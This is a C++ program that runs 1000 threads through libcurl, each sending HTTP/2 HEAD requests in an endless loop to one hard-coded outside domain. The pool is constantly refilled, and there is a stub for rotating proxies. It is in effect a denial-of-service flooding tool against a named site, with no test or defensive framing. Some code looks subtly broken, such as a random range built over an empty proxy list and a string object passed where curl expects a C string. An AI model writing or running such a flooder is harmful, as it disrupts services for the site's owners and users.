#include <curl/curl.h>
#include <cstdlib>
#include <iostream>
#include <string>
#include <random>

//Our includes.
#include "thread_pool.hpp"

const int max_thread_count = 1000;
BS::thread_pool pool(max_thread_count); // Adjust the pool size as needed

std::string const host = "https://nodec.mediathektv.com";
int version = 11;

const std::vector<std::string> proxies = {};

std::random_device rd;
std::mt19937 eng(rd());
std::uniform_int_distribution<> distr(0, proxies.size() - 1);

void curl_test()
{
	CURL* curl = curl_easy_init();
	if (curl)
	{
		curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
		curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
		curl_easy_setopt(curl, CURLOPT_URL, host);

		while (true)
		{
			CURLcode res = curl_easy_perform(curl);
		}

		curl_easy_cleanup(curl);
	}
}

int main()
{
	srand((unsigned)time(NULL));
	for (int i = 0; i < max_thread_count; i++)
	{
		pool.submit_task([] { curl_test(); });
	}

	while (true)
	{
		auto running = pool.get_tasks_running();
		auto refil = max_thread_count - running;
		for (int i = 0; i < refil; i++)
		{
			pool.submit_task([] { curl_test(); });
		}
	}

	return EXIT_SUCCESS;
}
